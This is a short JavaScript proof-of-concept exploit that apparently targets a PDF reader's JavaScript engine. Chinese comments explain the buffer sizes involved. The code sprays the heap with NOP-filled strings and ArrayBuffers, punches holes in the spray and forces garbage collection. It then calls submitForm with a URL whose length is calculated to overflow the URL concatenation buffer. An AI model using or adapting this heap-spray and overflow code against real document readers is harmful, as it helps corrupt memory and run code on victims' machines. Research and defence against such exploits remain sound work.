function gc() {
  new ArrayBuffer(3 * 1024 * 1024 * 100);
}

function createArrayBuffer(blockSize) {
  //创建一个ArrayBuffer，该ArrayBuffer可用于与TypedBuffer共享同一片内存
  var ab = new ArrayBuffer(blockSize - 0x10);
  //使用Uint8Array类型的TypedArray与ArrayBuffer共享同一片内存
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < ab.byteLength; i++) {
    u8[i] = 0x41;
  }
  return ab;
}

//相对URL缓冲区大小为0x110
var strBlockSize = 0x110;
//拼接URL缓冲区大小为相对URL缓冲区大小0x110+基本URL缓冲区大小0x10
var buffBlockSize = 0x120;

var sprayStrLen = (strBlockSize / 2) - 1;
var sprayStr = unescape('%u9090%u4140%u4041%uFFFF%u0000') + unescape('%u9090').repeat(sprayStrLen - 5);


var arrS = new Array(0x2000);
for (var i = 0; i < arrS.length; i++) {
  arrS[i] = sprayStr.substr(0, sprayStrLen).toUpperCase();
}
for (var i = 0; i < arrS.length; i += 2) {
  arrS[i] = null;
  arrS[i] = undefined;
}

var arrB = new Array(0x2000);
for (var i = 0; i < arrB.length; i++) {
  arrB[i] = createArrayBuffer(buffBlockSize);
}
for (var i = 0; i < arrB.length; i += 2) {
  arrB[i] = null;
  arrB[i] = undefined;
}

gc();

app.alert("test");

//分配的相对URL长度为strBlockSize，包含ASCII终结符
this.submitForm('bb' + 'a'.repeat(strBlockSize - 2 - 1));